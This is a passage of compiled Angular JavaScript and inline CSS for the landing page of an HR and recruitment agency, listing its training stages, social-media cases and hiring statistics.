            _(31, " Training of candidates "),
            g()(),
            p(32, "div", 24)(33, "div", 22),
            _(34, " Integration into the employer's corporate system "),
            g()(),
            p(35, "div", 25)(36, "div", 22),
            _(37, " Formation of corporate culture "),
            g()()()()()(),
            p(38, "section", 26)(39, "div", 27)(40, "div", 28)(41, "div", 29)(
              42,
              "div",
              30
            ),
            _(43, " RECRUITMENT AND ADAPTATION STRATEGY "),
            g(),
            p(44, "div", 31)(45, "p"),
            _(
              46,
              "- A comprehensive HR strategy from HR and business analytics specialists. "
            ),
            g(),
            p(47, "p"),
            _(
              48,
              "- Solving recruitment and corporate culture problems with the help of SMM tools. "
            ),
            g(),
            p(49, "p"),
            _(
              50,
              "- Streamlined process of recruitment and adaptation of personnel."
            ),
            g(),
            p(51, "p"),
            _(
              52,
              "- More than 75,000 best digital specialists in our database."
            ),
            g(),
            p(53, "p"),
            _(
              54,
              "- Candidates are trained according to the world's best personnel training systems and have practical, highly qualified experience."
            ),
            g()()(),
            p(55, "div", 32),
            B(56, "img", 33),
            g()()()(),
            p(57, "section", 34)(58, "div", 35)(59, "div", 36)(60, "div", 37),
            _(61, " PERSONNEL TRANDING SYSTEM "),
            g(),
            p(62, "div", 38)(63, "div", 39)(64, "div", 40),
            _(65, " QUALIFICATION "),
            g(),
            p(66, "div", 41),
            _(
              67,
              " Candidates are trained according to the best global training systems, such as the outbuilding system, where 90% of the training time is allocated to practice and 10% to theory, as well as similar systems. "
            ),
            g(),
            p(68, "div", 42)(69, "button"),
            _(70, " I'm interested "),
            g()()(),
            p(71, "div", 39)(72, "div", 40),
            _(73, " TRANDING "),
            g(),
            p(74, "div", 41),
            _(
              75,
              " Qualified employees are trained according to the corporate system of the business partner, which significantly increases the production efficiency of future employees. "
            ),
            g(),
            p(76, "div", 42)(77, "button"),
            _(78, " I'm interested "),
            g()()(),
            p(79, "div", 39)(80, "div", 40),
            _(81, " EMPLOYMENT "),
            g(),
            p(82, "div", 41),
            _(
              83,
              " We hire qualified and well-trained specialists, guaranteeing their high professional suitability and efficiency. "
            ),
            g(),
            p(84, "div", 42)(85, "button"),
            _(86, " I'm interested "),
            g()()(),
            p(87, "div", 39)(88, "div", 40),
            _(89, " SUPPORT "),
            g(),
            p(90, "div", 41),
            _(
              91,
              " We support new employees for six months after they join the company, enhancing their skills and professional value. "
            ),
            g(),
            p(92, "div", 42)(93, "button"),
            _(94, " I'm interested "),
            g()()()()()()(),
            p(95, "section", 43)(96, "div", 44),
            B(97, "div", 45),
            g()(),
            p(98, "section", 46),
            B(99, "div", 47),
            p(100, "div", 48)(101, "div", 49)(102, "div", 50),
            _(
              103,
              " Expert evaluation of the effectiveness of training systems. "
            ),
            g(),
            p(104, "div", 50),
            _(
              105,
              " Systems for managing the growth of employee qualifications. "
            ),
            g(),
            p(106, "div", 50),
            _(107, " The best systems of training and support of personnel. "),
            g(),
            p(108, "div", 50),
            _(109, " Recruitment and talent identification systems. "),
            g(),
            p(110, "div", 50),
            _(
              111,
              " Development of mechanisms for effective systematic management of business process performance. "
            ),
            g(),
            p(112, "div", 50),
            _(
              113,
              " Systems for planning the development and retraining of the company's human resources. "
            ),
            g()()()(),
            p(114, "section", 51)(115, "div", 52)(116, "div", 53)(
              117,
              "div",
              54
            ),
            B(118, "div", 47),
            p(119, "div", 55)(120, "img", 56),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone1.png",
                "assets/images/phone2.png",
                "assets/images/phone3.png",
                "assets/images/phone4.png",
                "assets/images/phone5.png",
                "assets/images/phone6.png",
              ]);
            }),
            g(),
            p(121, "img", 57),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone2.png",
                "assets/images/phone3.png",
                "assets/images/phone4.png",
                "assets/images/phone5.png",
                "assets/images/phone6.png",
                "assets/images/phone1.png",
              ]);
            }),
            g(),
            p(122, "img", 58),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone3.png",
                "assets/images/phone4.png",
                "assets/images/phone5.png",
                "assets/images/phone6.png",
                "assets/images/phone1.png",
                "assets/images/phone2.png",
              ]);
            }),
            g()(),
            p(123, "div", 59)(124, "div", 60),
            _(125, " SMM "),
            g(),
            p(126, "div", 61),
            _(127, " CASES "),
            g(),
            p(128, "div", 62),
            _(129, " Business positioning system in social networks. "),
            g()()(),
            p(130, "div", 63)(131, "div", 59)(132, "div", 60),
            _(133, " SMM "),
            g(),
            p(134, "div", 61),
            _(135, " CASES "),
            g(),
            p(136, "div", 62),
            _(137, " Business positioning system in social networks. "),
            g()(),
            B(138, "div", 47),
            p(139, "div", 64)(140, "img", 65),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone4.png",
                "assets/images/phone5.png",
                "assets/images/phone6.png",
                "assets/images/phone1.png",
                "assets/images/phone2.png",
                "assets/images/phone3.png",
              ]);
            }),
            g(),
            p(141, "img", 66),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone5.png",
                "assets/images/phone6.png",
                "assets/images/phone1.png",
                "assets/images/phone2.png",
                "assets/images/phone3.png",
                "assets/images/phone4.png",
              ]);
            }),
            g(),
            p(142, "img", 67),
            oe("click", function () {
              return o.openGallery([
                "assets/images/phone6.png",
                "assets/images/phone1.png",
                "assets/images/phone2.png",
                "assets/images/phone3.png",
                "assets/images/phone4.png",
                "assets/images/phone5.png",
              ]);
            }),
            g()()()()()(),
            p(143, "section", 68)(144, "div", 69)(145, "div", 70)(
              146,
              "div",
              71
            )(147, "div", 72),
            _(148, " CASE "),
            g(),
            p(149, "div", 73),
            _(150, " Selection of IT specialists "),
            g(),
            p(151, "div", 74),
            _(152, " Objective: Select and train promising IT engineers "),
            g()(),
            p(153, "div", 75)(154, "div", 76),
            _(155, " TOOLS: "),
            g(),
            p(156, "div", 77)(157, "p"),
            _(158, "- IT specialists' qualification assessment system;"),
            g(),
            p(159, "p"),
            _(160, "- Personnel reserve selection system;"),
            g(),
            p(161, "p"),
            _(162, "- Candidate training system;"),
            g(),
            p(163, "p"),
            _(164, "- New employee support system."),
            g()()()()()(),
            p(165, "section", 78),
            B(166, "div", 47),
            p(167, "div", 79)(168, "div", 80)(169, "div", 81)(170, "div", 82)(
              171,
              "div",
              83
            ),
            B(172, "img", 84)(173, "img", 85)(174, "img", 86),
            g(),
            p(175, "div", 87)(176, "div", 88),
            _(177, " 2630 "),
            g(),
            p(178, "div", 89),
            _(179, " Resumes received "),
            g()()(),
            p(180, "div", 82)(181, "div", 83),
            B(182, "img", 84)(183, "img", 85)(184, "img", 86),
            g(),
            p(185, "div", 87)(186, "div", 88),
            _(187, " 1106 "),
            g(),
            p(188, "div", 89),
            _(189, " Resumes selected "),
            g()()(),
            p(190, "div", 82)(191, "div", 83),
            B(192, "img", 84)(193, "img", 85)(194, "img", 86),
            g(),
            p(195, "div", 87)(196, "div", 88),
            _(197, " 700+ "),
            g(),
            p(198, "div", 89),
            _(199, " Interviews conducted "),
            g()()(),
            p(200, "div", 82)(201, "div", 83),
            B(202, "img", 84)(203, "img", 85)(204, "img", 86),
            g(),
            p(205, "div", 87)(206, "div", 88),
            _(207, " 372 "),
            g(),
            p(208, "div", 89),
            _(209, " IT engineers hired "),
            g()()()(),
            p(210, "div", 90),
            B(211, "img", 91)(212, "img", 92)(213, "img", 93),
            g()()()(),
            p(214, "section", 94)(215, "div", 69)(216, "div", 70)(
              217,
              "div",
              71
            )(218, "div", 72),
            _(219, " CASE "),
            g(),
            p(220, "div", 73),
            _(221, " Selection of Digital Marketers "),
            g()(),
            p(222, "div", 75)(223, "div", 76),
            _(224, " TOOLS: "),
            g(),
            p(225, "div", 77)(226, "p"),
            _(227, "- Creating an HR Funnel;"),
            g(),
            p(228, "p"),
            _(229, "- Expert assessment of soft skills;"),
            g(),
            p(230, "p"),
            _(231, "- Analysis of compliance with business requirements;"),
            g(),
            p(232, "p"),
            _(233, "- Selection of relevant candidates."),
            g()()()()()(),
            p(234, "section", 95)(235, "div", 96),
            B(236, "div", 47),
            p(237, "div", 97)(238, "div", 98)(239, "div", 99)(240, "div", 100),
            B(241, "img", 84)(242, "img", 85)(243, "img", 86),
            g(),
            p(244, "div", 101)(245, "div", 102),
            _(246, " 5700+ "),
            g(),
            p(247, "div", 103),
            _(248, " Responses to the vacancy "),
            g()()(),
            p(249, "div", 99)(250, "div", 100),
            B(251, "img", 84)(252, "img", 85)(253, "img", 86),
            g(),
            p(254, "div", 101)(255, "div", 102),
            _(256, " 1800+ "),
            g(),
            p(257, "div", 103),
            _(258, " Relevant candidates "),
            g()()(),
            p(259, "div", 99)(260, "div", 100),
            B(261, "img", 84)(262, "img", 85)(263, "img", 86),
            g(),
            p(264, "div", 101)(265, "div", 102),
            _(266, " 650+ "),
            g(),
            p(267, "div", 103),
            _(268, " candidates selected "),
            g()()()(),
            p(269, "div", 104),
            B(270, "img", 105)(271, "img", 106)(272, "img", 107)(
              273,
              "img",
              108
            ),
            g()()()(),
            p(274, "section", 109),
            B(275, "div", 47),
            p(276, "div", 110)(277, "div", 111)(278, "div", 112)(
              279,
              "div",
              113
            ),
            _(280, " Time-tested experience "),
            g(),
            p(281, "div", 113),
            _(282, " Community of experts "),
            g(),
            p(283, "div", 113),
            _(284, " Effective work with personnel "),
            g(),
            p(285, "div", 113),
            _(286, " Agency on the international market "),
            g()(),
            p(287, "div", 114),
            B(288, "img", 115)(289, "img", 116)(290, "img", 117)(
              291,
              "img",
              118
            )(292, "img", 119),
            g()()()(),
            B(293, "app-profile-cardsfooter")(294, "app-footer"),
            g()),
            2 & r && (Be(3), Et("ngIf", o.showGallery));
        },
        dependencies: [kg, Qm, Km, Xm],
        styles: [
          '@keyframes _ngcontent-%COMP%_blinkDot1{0%,to{opacity:1;filter:drop-shadow(0 0 10px #8FD0FF)}50%{opacity:.5;filter:drop-shadow(0 0 20px #8FD0FF)}}@keyframes _ngcontent-%COMP%_blinkDot2{0%,to{opacity:1;filter:drop-shadow(0 0 10px #FF8A00)}50%{opacity:.5;filter:drop-shadow(0 0 20px #FF8A00)}}@keyframes _ngcontent-%COMP%_blink-Circle{0%{opacity:0;animation-timing-function:linear}1%{opacity:0;animation-timing-function:ease-in-out}51%{opacity:1;animation-timing-function:ease-in-out}to{opacity:0}}.fade-in-section[_ngcontent-%COMP%]{opacity:0;transform:translateY(20px);transition:opacity .6s ease-out,transform .6s ease-out}.fade-in-section.is-visible[_ngcontent-%COMP%]{opacity:1;transform:translateY(0)}app-header[_ngcontent-%COMP%]{position:relative;z-index:1000}.wrapper--standards--section[_ngcontent-%COMP%]{position:relative;min-height:630.93px;overflow:hidden}.wrapper--standards--section[_ngcontent-%COMP%]:before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:url(/assets/images/dot1.png) no-repeat 20% 19%,url(/assets/images/dot1.png) no-repeat 53% 75%,url(/assets/images/dot1.png) no-repeat 63.5% 15%;background-size:100px 100px;background-position:26% 24%,52.7% 73%,63.5% 20%;animation:_ngcontent-%COMP%_blinkDot1 2s infinite;opacity:1}.wrapper--standards--section[_ngcontent-%COMP%]:after{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:url(/assets/images/dot2.png) no-repeat,url(/assets/images/dot2.png) no-repeat,url(/assets/images/dot2.png) no-repeat,url(/assets/images/dot2.png) no-repeat,url(/assets/images/dot2.png) no-repeat,url(/assets/images/dot2.png) no-repeat;background-size:100px 100px;background-position:45% 11%,34% 39%,38.5% 90%,54% 32%,75.6% 24%,71% 78%;animation:_ngcontent-%COMP%_blinkDot2 2s infinite;opacity:1}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]{position:relative;background-color:#000;background:url(/assets/images/bgmap.webp);background-position:top center;background-repeat:no-repeat;background-size:1440px;display:flex;flex-direction:column;justify-content:space-around;min-height:600px;z-index:1}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]{display:flex;justify-content:space-between;width:100%;align-items:center}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]{width:100%;min-height:281px;gap:15px;display:flex;flex-direction:column;justify-content:space-between}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--title[_ngcontent-%COMP%]{width:100%;min-height:30px;color:#fff;font-family:Raleway;font-size:56px;font-weight:800;line-height:120%;text-align:left;text-transform:uppercase}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--subtitile[_ngcontent-%COMP%]{width:100%;min-height:51px;color:#d9d5d5;font-family:Raleway;font-size:16px;font-weight:400;line-height:120%;text-align:left}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--description[_ngcontent-%COMP%]{display:flex;align-items:center;gap:20px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--description[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:220px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--description[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:80px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]{width:100%;height:500px;position:relative}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{cursor:pointer}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:182px;height:171px;position:absolute;top:60px;left:130px;transition:top .5s ease-out}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{top:40px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:182px;height:253px;position:absolute;top:250px;left:130px;transition:top .5s ease-out}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{top:232px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px;height:251px;position:absolute;top:185px;left:335px;transition:top .5s ease-out}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{top:165px}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:257px;height:143px;position:absolute;top:20px;left:335px;transition:top .5s ease-out}.wrapper--standards--section[_ngcontent-%COMP%]   .wrapper--standards[_ngcontent-%COMP%]   .standards--block--main[_ngcontent-%COMP%]   .standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4):hover{top:0}@media (max-width: 375px){.standards--block--info--description[_ngcontent-%COMP%]{display:flex;align-items:center;gap:20px}.standards--block--info--description[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:160px!important}.standards--block--info--description[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:60px!important}}@media (max-width: 1131px){.standards--block--main[_ngcontent-%COMP%]{padding:10px!important}.standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){width:182px;height:171px;position:absolute;top:60px;left:0!important;transition:top .5s ease-out}.standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){width:182px;height:253px;position:absolute;top:250px;left:0!important;transition:top .5s ease-out}.standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){width:184px;height:251px;position:absolute;top:185px;left:205px!important;transition:top .5s ease-out}.standards--block--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(4){width:257px;height:143px;position:absolute;top:20px;left:205px!important;transition:top .5s ease-out}}@media (max-width: 830px){.standards--block--main[_ngcontent-%COMP%]{justify-content:center!important}.standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]{justify-content:space-evenly!important}.standards--block--main[_ngcontent-%COMP%]   .standards--block--info[_ngcontent-%COMP%]   .standards--block--info--title[_ngcontent-%COMP%]{font-size:24px!important}.standards--block--info[_ngcontent-%COMP%]{padding:10px!important}.standards--block--img[_ngcontent-%COMP%]{display:none!important}}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]{display:flex;justify-content:center;flex-direction:column;background:url(/assets/images/hragency.png) no-repeat 76% 30%;max-width:1200px;min-height:586px}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]{display:flex;justify-content:space-between;flex-direction:column;max-width:1200px;min-height:289px}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--title[_ngcontent-%COMP%]{max-width:342px;min-height:100px;color:#fff;font-family:Raleway;font-size:56px;font-weight:800;text-align:left;text-transform:uppercase}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]{display:flex;justify-content:space-between;max-width:1200px;min-height:133px}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .system--description[_ngcontent-%COMP%]{display:flex;justify-content:center;align-items:center;max-width:211px;min-height:133px;box-sizing:border-box;border-radius:12px}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .system--description[_ngcontent-%COMP%]   .system--description--title[_ngcontent-%COMP%]{display:flex;justify-content:center;align-items:center;width:158px;height:51px;color:#fff;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:center}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]{perspective:1000px;position:relative}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]   .content[_ngcontent-%COMP%]{position:relative;overflow:hidden;transform-style:preserve-3d;transition:transform var(--transition-duration, .5s) var(--transition-timing-function, linear);display:grid;place-items:center;height:133px;width:211px;border:1px solid rgb(217,213,213);border-radius:12px;font-family:system-ui,sans-serif;font-size:14px;color:#fff;--bg-overlay: rgb(0 0 0 / .5);text-align:center}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]   .content[_ngcontent-%COMP%]:before, .wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]   .content[_ngcontent-%COMP%]:after{content:"";position:absolute;inset:0;z-index:-1;transform-style:preserve-3d}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]:hover > .content[_ngcontent-%COMP%]:before{transform:scale(1.33) translate(calc(-12.5% * var(--posX, 0))) translateY(calc(-12.5% * var(--posY, 0)))}.wrapper--system--section[_ngcontent-%COMP%]   .system--section[_ngcontent-%COMP%]   .system--info[_ngcontent-%COMP%]   .system--description--main[_ngcontent-%COMP%]   .phce[_ngcontent-%COMP%]:hover > .content[_ngcontent-%COMP%]{transform:rotateX(calc(22.5deg * var(--posY, 0))) rotateY(calc(-22.5deg * var(--posX, 0)))}@media (max-width: 845px){.system--section[_ngcontent-%COMP%]{margin-bottom:80px}.system--info[_ngcontent-%COMP%]{padding:10px}.system--description--main[_ngcontent-%COMP%]{justify-content:center!important;gap:10px;flex-wrap:wrap}.system--description[_ngcontent-%COMP%]{width:50%!important}.system--title[_ngcontent-%COMP%]{font-size:24px!important;text-align:center!important}}.wrapper--strategy--section[_ngcontent-%COMP%]   .strategy--section[_ngcontent-%COMP%]   .strategy--info[_ngcontent-%COMP%]{display:flex;justify-content:space-between;align-items:center;max-width:1200px;min-height:373px}.wrapper--strategy--section[_ngcontent-%COMP%]   .strategy--section[_ngcontent-%COMP%]   .strategy--info[_ngcontent-%COMP%]   .strategy--info--leftSide[_ngcontent-%COMP%]{width:90%;padding:10px}.wrapper--strategy--section[_ngcontent-%COMP%]   .strategy--section[_ngcontent-%COMP%]   .strategy--info[_ngcontent-%COMP%]   .strategy--info--leftSide[_ngcontent-%COMP%]   .strategy--info--leftSide--title[_ngcontent-%COMP%]{width:100%;min-height:30px;color:#fff;font-family:Raleway;font-size:56px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--strategy--section[_ngcontent-%COMP%]   .strategy--section[_ngcontent-%COMP%]   .strategy--info[_ngcontent-%COMP%]   .strategy--info--leftSide[_ngcontent-%COMP%]   .strategy--info--leftSide--subtitle[_ngcontent-%COMP%]{color:#d9d5d5;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--strategy--section[_ngcontent-%COMP%]   .strategy--section[_ngcontent-%COMP%]   .strategy--info[_ngcontent-%COMP%]   .strategy--info--rightSide[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{width:350px;height:500px}@media (max-width: 683px){.strategy--section[_ngcontent-%COMP%]{margin-bottom:56px}.strategy--info[_ngcontent-%COMP%]{padding:10px;flex-direction:column}.strategy--info--leftSide[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:40px}.strategy--info--leftSide--title[_ngcontent-%COMP%]{font-size:24px!important}}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]{display:flex;align-items:center;min-height:870px}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]{width:100%;display:flex;justify-content:space-between;flex-direction:column;min-height:472px}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--title[_ngcontent-%COMP%]{width:100%;min-height:100px;color:#fff;font-family:Raleway;font-size:56px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]{display:flex;justify-content:space-between;align-items:center;position:relative}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]{display:flex;justify-content:space-evenly;flex-direction:column;width:250px;height:360px;padding:22px;box-sizing:border-box;border:1px solid rgb(203,203,203);border-radius:8px;transition:.3s ease-out;z-index:1000}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]   .trandind--info--card--title[_ngcontent-%COMP%]{color:#fff;font-size:18px;font-family:Raleway;line-height:1;font-weight:600;text-transform:uppercase;background-position:center center;border-color:transparent;border-style:solid}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]   .tranding--info--card--subtitle[_ngcontent-%COMP%]{color:#d9d5d5;font-family:Raleway;font-size:13px;font-weight:400;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]   .tranding--info--card--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]{width:180px;height:60px;box-sizing:border-box;border:1px solid rgb(255,255,255);border-radius:22px;background:#151515;color:#fff;font-family:Raleway;font-size:13px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:center;transition:.3s ease-out}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]   .tranding--info--card--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]:hover{background:#fff;color:#ff8a00}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1){width:310px;height:400px;border-radius:12px;background:#ff8a00}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1)   button[_ngcontent-%COMP%]{background:#fff!important;color:#ff8a00!important}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1)   button[_ngcontent-%COMP%]:hover{background:#151515!important;color:#fff!important}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1)   .trandind--info--card--title[_ngcontent-%COMP%]{color:#fff;font-size:28px;font-family:Raleway;line-height:1;font-weight:700;text-transform:uppercase;background-position:center center;border-color:transparent;border-style:solid}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1)   .tranding--info--card--subtitle[_ngcontent-%COMP%]{color:#fff;font-size:15px;font-family:Raleway;line-height:1.3;font-weight:400;background-position:center center;border-color:transparent;border-style:solid}.wrapper--tranding--section[_ngcontent-%COMP%]   .wrapper--tranding[_ngcontent-%COMP%]   .tranding--info[_ngcontent-%COMP%]   .tranding--info--card--main[_ngcontent-%COMP%]   .tranding--info--card[_ngcontent-%COMP%]:nth-child(1)   .tranding--info--card--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]{width:180px;height:60px}@media (max-width: 996px){.tranding--info[_ngcontent-%COMP%]{padding:10px;flex-direction:column;margin-bottom:88px}.tranding--info--card--main[_ngcontent-%COMP%]{flex-direction:column;gap:20px}.tranding--info--title[_ngcontent-%COMP%]{font-size:24px!important}}@media (max-width: 768px){.wrapper--tranding--section.section.fade-in-section[_ngcontent-%COMP%]{opacity:1;transform:translateY(0);animation:fadeIn 1s forwards}}.wrapper--parallax--section[_ngcontent-%COMP%]{min-height:700px;position:relative;overflow:hidden}.wrapper--parallax--section[_ngcontent-%COMP%]   .wrapper--parallax[_ngcontent-%COMP%]{background:url(/assets/images/Paralax.png) 0 0 no-repeat fixed;background-size:cover;position:relative}.wrapper--parallax--section[_ngcontent-%COMP%]   .wrapper--parallax[_ngcontent-%COMP%]   .parallax[_ngcontent-%COMP%]{min-height:700px}@keyframes _ngcontent-%COMP%_pulse{0%{background-size:25% 75%,25% 